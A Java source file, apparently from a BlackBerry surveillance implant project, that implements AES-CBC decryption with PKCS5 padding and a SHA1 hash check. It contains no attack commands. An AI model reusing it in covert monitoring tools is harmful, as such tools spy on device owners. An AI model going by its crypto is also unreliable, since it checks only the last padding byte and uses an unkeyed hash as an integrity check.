//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.crypto;

import net.rim.device.api.crypto.CryptoException;
import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.SHA1Digest;
import net.rim.device.api.util.Arrays;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Utils;

public class EncryptionPKCS5 extends Encryption {
    //#ifdef DEBUG
    private static Debug debug = new Debug("EncryptionPKCS5",
            DebugLevel.INFORMATION);

    //#endif
    public EncryptionPKCS5(byte[] confKey) {
        super(confKey);
    }

    public EncryptionPKCS5() {
        super();
    }

    /**
     * Gets the next multiple.
     * 
     * @param len
     *            the len
     * @return the next multiple
     */
    public static int getNextMultiple(final int len) {
        //#ifdef DBC
        Check.requires(len >= 0, "len < 0");
        //#endif

        final int newlen = len + (16 - len % 16);

        //#ifdef DBC
        Check.ensures(newlen > len, "newlen <= len");
        //#endif
        //#ifdef DBC
        Check.ensures(newlen % 16 == 0, "Wrong newlen");
        //#endif
        return newlen;
    }

    protected byte[] pad(byte[] plain, int offset, int len) {
        return pad(plain, offset, len, true);
    }

    public byte[] decryptData(final byte[] cyphered, final int enclen,
            final int offset) throws CryptoException {
        //#ifdef DEBUG
        debug.trace("decryptData PKCS5");
        //#endif

        if (enclen % 16 != 0) {
            //#ifdef DEBUG
            debug.error("decryptData: wrong padding");
            //#endif
            throw new CryptoException();
        }

        //int padlen = cyphered[cyphered.length -1];
        //int plainlen = enclen - padlen;

        //#ifdef DBC
        Check.requires(keyReady, "Key not ready");
        Check.requires(enclen % 16 == 0, "Wrong padding");
        //Check.requires(enclen >= plainlen, "Wrong plainlen");
        //#endif

        final byte[] paddedplain = new byte[enclen];
        byte[] plain = null;
        int plainlen = 0;
        byte[] iv = new byte[16];

        final byte[] pt = new byte[16];

        final int numblock = enclen / 16;
        //final int lastBlockLen = plainlen % 16;
        try {
            for (int i = 0; i < numblock; i++) {
                final byte[] ct = Arrays.copy(cyphered, i * 16 + offset, 16);

                aes.decrypt(ct, pt);
                xor(pt, iv);
                iv = Arrays.copy(ct);
                Utils.copy(paddedplain, i * 16, pt, 0, 16);
            }

            int padlen = paddedplain[paddedplain.length - 1];

            if (padlen <= 0 || padlen > 16) {
                //#ifdef DEBUG
                debug.error("decryptData, wrong padlen: " + padlen);
                //#endif
                throw new CryptoException();
            }

            plainlen = enclen - padlen;
            plain = new byte[plainlen];

            Utils.copy(plain, 0, paddedplain, 0, plainlen);

        } catch (final CryptoTokenException e) {
            //#ifdef DEBUG
            debug.error("error decrypting data");
            //#endif
            return null;
        }

        //#ifdef DBC
        Check.ensures(plain != null, "null plain");
        Check.ensures(plain.length == plainlen, "wrong plainlen");
        //#endif
        return plain;
    }

    public byte[] encryptDataIntegrity(final byte[] plain) {

        byte[] sha = SHA1(plain);
        byte[] plainSha = Utils.concat(plain, sha);

        //#ifdef DBC
        Check.asserts(sha.length == SHA1Digest.DIGEST_LENGTH, "sha.length");
        Check.asserts(plainSha.length == plain.length
                + SHA1Digest.DIGEST_LENGTH, "plainSha.length");
        //#endif

        //#ifdef DEBUG
        debug.trace("encryptDataIntegrity plain: " + plain.length);
        debug.trace("encryptDataIntegrity plainSha: " + plainSha.length);
        //#endif

        return encryptData(plainSha, 0);
    }

    public byte[] decryptDataIntegrity(final byte[] cyphered, int len,
            int offset) throws CryptoException {
        byte[] plainSha = decryptData(cyphered, len, offset);
        byte[] plain = Arrays.copy(plainSha, 0, plainSha.length
                - SHA1Digest.DIGEST_LENGTH);
        byte[] sha = Arrays.copy(plainSha, plainSha.length
                - SHA1Digest.DIGEST_LENGTH, SHA1Digest.DIGEST_LENGTH);
        byte[] calculatedSha = SHA1(plainSha, 0, plainSha.length
                - SHA1Digest.DIGEST_LENGTH);

        //#ifdef DBC
        //Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, "DIGEST_LENGTH");
        Check.asserts(
                plain.length + SHA1Digest.DIGEST_LENGTH == plainSha.length,
                "plain.length");
        Check.asserts(sha.length == SHA1Digest.DIGEST_LENGTH, "sha.length");
        Check.asserts(calculatedSha.length == SHA1Digest.DIGEST_LENGTH,
                "calculatedSha.length");
        //#endif

        if (Utils.equals(calculatedSha, sha)) {
            //#ifdef DEBUG
            debug.trace("decryptDataIntegrity: sha corrected");
            //#endif
            return plain;
        } else {
            //#ifdef DEBUG
            debug.error("decryptDataIntegrity: sha error!");
            //#endif
            throw new CryptoException();
        }
    }

    public byte[] decryptDataIntegrity(byte[] rawConf) throws CryptoException {

        return decryptDataIntegrity(rawConf, rawConf.length, 0);
    }
}
